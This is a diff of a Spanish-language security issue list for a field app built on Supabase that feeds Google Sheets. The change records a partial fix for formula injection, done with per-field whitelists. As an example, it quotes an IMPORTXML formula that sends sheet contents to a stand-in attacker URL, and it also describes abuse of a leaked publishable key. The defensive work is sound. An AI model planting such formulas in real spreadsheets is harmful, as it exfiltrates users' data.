@@ -506,14 +506,14 @@
 * **Hallazgo:** la clave publicable se extrae del APK en minutos. Con ella cualquiera puede: (a) enviar jornadas falsas por la RPC (altera los KPIs); (b) marcar herramientas como "Extraviado"/"Dañado" (ISSUE-39); (c) subir archivos de hasta 5 MB al bucket **público**: `allowed_mime_types` solo revisa el encabezado `Content-Type`, no el contenido, así que se podría alojar contenido arbitrario servido desde el proyecto.
 * **Mitigación:** de fondo, ISSUE-38 (cuenta por teléfono; quitar `EXECUTE` y el `INSERT` del bucket a `anon`). Mientras tanto: repartir el APK solo a brigadas de confianza y revisar límites de tasa en el panel de Supabase.
 
-### `[ISSUE-58]` 🔴 Inyección de fórmulas en Google Sheets — latente, corregir antes de ISSUE-27
+### `[ISSUE-58]` 🔴 Inyección (parte RPC y app ✅; falta el conector) de fórmulas en Google Sheets — latente, corregir antes de ISSUE-27
 * **Hallazgo:** el conector actual no funciona (lee `vista_reporte_jornadas`, que ya no existe, con la clave pública), pero cuando se rehaga y copie nombres, motivos de omisión, encargado de pesaje o N° de guía con `setValues()`, un texto que empiece con `=` se ejecutará como fórmula. Ej.: un "voluntario" `=IMPORTXML("https://atacante…?"&A1:Z99)` enviaría el contenido de la planilla a un tercero. Con ISSUE-57 cualquiera puede inyectar ese texto.
 > **Decisiones del 13-11-2026:** en vez de vetar solo los símbolos iniciales, cada campo de texto libre acepta **solo sus caracteres permitidos** (lista blanca), con el mismo criterio en la app (error bajo el campo, no deja avanzar), en `ValidadorJornada` y en la RPC:
 > - **Nombres** (líder, voluntarios, encargado de pesaje): letras (con tildes, ñ, ü), espacios y apóstrofo; empieza con letra; máx. 80.
 > - **Motivo de omisión de foto:** letras, números y espacios; empieza con letra o número; máx. 120.
 > - **N° de guía de despacho:** letras, números y guion; empieza con letra o número; 1 a 12 caracteres (ver ISSUE-60).
 * **Criterios de aceptación:**
-  - [ ] RPC, `ValidadorJornada` y campos de la app con la misma lista blanca por campo.
+  - [x] RPC, `ValidadorJornada` y campos de la app con la misma lista blanca por campo.
   - [ ] Conector (ISSUE-27): anteponer `'` a todo texto antes de `setValues()`.
 
 ### `[ISSUE-59]` ✅ 🟠 ID de jornada corto: fotos públicas adivinables y suplantación de jornadas
